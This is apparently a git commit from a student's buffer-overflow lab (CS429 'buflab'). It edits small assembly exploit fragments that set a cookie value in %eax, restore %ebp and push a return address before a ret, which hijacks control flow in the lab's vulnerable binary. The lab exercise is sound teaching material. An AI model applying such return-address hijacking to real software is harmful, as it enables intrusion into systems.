8257c0655c0830cb422ab7a66cf1be0b9894049e
otisbrower <otis.brower@centexbe.com>
2015-04-13 22:47:29 -0500

    trying to add

--- CS429/buflab-handout/fc-as.s
+++ CS429/buflab-handout/fc-as.s
@@ -1,4 +1,3 @@
 movl $0x34b2f5eb, %eax
-movl $0x55683030, %ebp
 pushl $0x08048da6
 ret
--- CS429/buflab-handout/nitroass.s
+++ CS429/buflab-handout/nitroass.s
@@ -5,7 +5,7 @@ nitro.o:     file format elf32-i386
 Disassembly of section .text:
 
 00000000 <.text>:
-   0:	8d 6c 24 28          	lea    0x28(%esp),%ebp
-   4:	b8 eb f5 b2 34       	mov    $0x34b2f5eb,%eax
-   9:	68 22 8e 04 08       	push   $0x8048e22
+   0:	68 1b 8e 04 08       	push   $0x8048e1b
+   5:	8d 6c 24 1c          	lea    0x1c(%esp),%ebp
+   9:	b8 eb f5 b2 34       	mov    $0x34b2f5eb,%eax
    e:	c3                   	ret    
